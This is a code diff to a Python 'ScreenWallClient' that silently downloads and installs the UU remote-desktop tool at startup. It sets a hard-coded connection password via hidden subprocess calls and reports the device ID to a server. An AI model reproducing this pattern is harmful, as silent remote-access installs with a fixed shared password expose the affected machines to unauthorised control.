@@ -1225,8 +1225,8 @@ class ScreenWallClient:
 
 
 
-    async def _do_install_uu(self, cfg, uu_download_url, uu_file_name):
-        """下载并静默安装UU远程"""
+    async def _do_install_uu(self, cfg, uu_download_url, uu_file_name, is_startup=False):
+        """下载并静默安装UU远程，is_startup=True表示启动时触发（不需要等60秒）"""
         try:
             if self._uu_install_triggered:
                 return
@@ -1272,14 +1272,47 @@ class ScreenWallClient:
                 install_cmd,
                 creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_BREAKAWAY_FROM_JOB
             )
-            # 安装完成后清除版本缓存，下次心跳重新读取
+            # 安装完成后清除版本缓存
             self._uu_version = None
             self._uu_version_time = 0
-            # 安装成功后重置标志，下次心跳再次比对（确认是否成功）
-            await asyncio.sleep(60)  # 等待安装完成
+            # 等安装完成
+            await asyncio.sleep(10)  # 等待安装完成
+            # 安装完成后重置标志，下次心跳再次比对（确认是否成功）
             self._uu_install_triggered = False
+            # 心跳升级时：重新执行初始化（设置密码 + 获取ID）
+            if not is_startup:
+                self._uu_init_and_register()
         except Exception:
             self._uu_install_triggered = False
+
+    def _uu_init_and_register(self):
+        """重新初始化UU（设置密码 + 获取ID），成功后触发重连"""
+        _uu_init_dir = self._get_uu_install_dir()
+        _uuycmgr = os.path.join(_uu_init_dir, "bin", "uuycmgr.exe") if _uu_init_dir else ""
+        if _uuycmgr and os.path.exists(_uuycmgr):
+            try:
+                subprocess.run(
+                    [_uuycmgr, "-c", "qqww5566"],
+                    capture_output=True, text=True, timeout=10,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+            except Exception:
+                pass
+            try:
+                result = subprocess.run(
+                    [_uuycmgr, "-d"],
+                    capture_output=True, text=True, timeout=10,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+                if result.returncode == 0:
+                    output = result.stdout.strip()
+                    if output.isdigit():
+                        self._uu_device_id = output
+                        self._uu_fetch_success = True
+            except Exception:
+                pass
+        # 强制重连，让服务端通过 register 拿到最新的 uuDeviceId
+        self._reconnect_async()
 
     async def _do_upgrade_async(self, cfg, latest_version="?"):
         """下载新版本 exe 并触发升级"""
@@ -2087,7 +2120,7 @@ class ScreenWallClient:
                         if data.get("installUU") and not self._uu_install_triggered:
                             uu_download_url = data.get("uuDownloadUrl", "")
                             uu_file_name = data.get("uuFileName", "")
-                            asyncio.create_task(self._do_install_uu(cfg, uu_download_url, uu_file_name))
+                            asyncio.create_task(self._do_install_uu(cfg, uu_download_url, uu_file_name, is_startup=False))
 
                 except Exception as _e:
                     pass
@@ -2132,7 +2165,49 @@ class ScreenWallClient:
             pass
 
     async def run(self):
-        # 启动时设置 UU 固定连接码 + 获取设备ID（从注册表定位安装路径）
+        # ── 启动时检查UU远程是否安装 ──────────────────────────────────────
+        if not self._is_uu_installed():
+            cfg = load_config()
+            srv = cfg.get("server", {})
+            host = srv.get("host", "localhost")
+            port = srv.get("port", 3000)
+            # 从 config.json 读取 uuDownloadUrl（服务端 public 目录下的文件）
+            import json as _json
+            config_path = os.path.join(BASE_DIR, "config.json")
+            _uu_download_url = ""
+            _uu_file_name = ""
+            if os.path.exists(config_path):
+                try:
+                    with open(config_path, "r", encoding="utf-8") as _f:
+                        _cfg_data = _json.load(_f)
+                        _uu_download_url = _cfg_data.get("uuDownloadUrl", "")
+                        if _uu_download_url:
+                            _uu_file_name = _uu_download_url.split("/")[-1]
+                except Exception:
+                    pass
+            if _uu_download_url:
+                # 动态构建完整URL
+                from urllib.parse import urlparse
+                _full_url = f"http://{host}:{port}/{_uu_file_name}"
+                # 下载安装
+                import tempfile, urllib.request
+                _tmp_dir = tempfile.gettempdir()
+                _tmp_path = os.path.join(_tmp_dir, _uu_file_name)
+                try:
+                    urllib.request.urlretrieve(_full_url, _tmp_path)
+                except Exception:
+                    pass
+                if os.path.exists(_tmp_path):
+                    subprocess.Popen(
+                        [_tmp_path, "/S", "/mode=7", "/bgstartup=yes",
+                         "/launchapp=no", "/autorun=yes",
+                         r'/D=C:\Program Files\Netease\GameViewer'],
+                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_BREAKAWAY_FROM_JOB
+                    )
+                    await asyncio.sleep(10)  # 等待安装完成
+                    self._uu_install_triggered = False  # 重置标志
+
+        # ── UU 初始化：设置固定连接码 + 获取设备ID ────────────────────────
         _uu_init_dir = self._get_uu_install_dir()
         _uuycmgr = os.path.join(_uu_init_dir, "bin", "uuycmgr.exe") if _uu_init_dir else ""
         if _uuycmgr and os.path.exists(_uuycmgr):
@@ -2144,7 +2219,6 @@ class ScreenWallClient:
                 )
             except Exception:
                 pass
-
             try:
                 result = subprocess.run(
                     [_uuycmgr, "-d"],
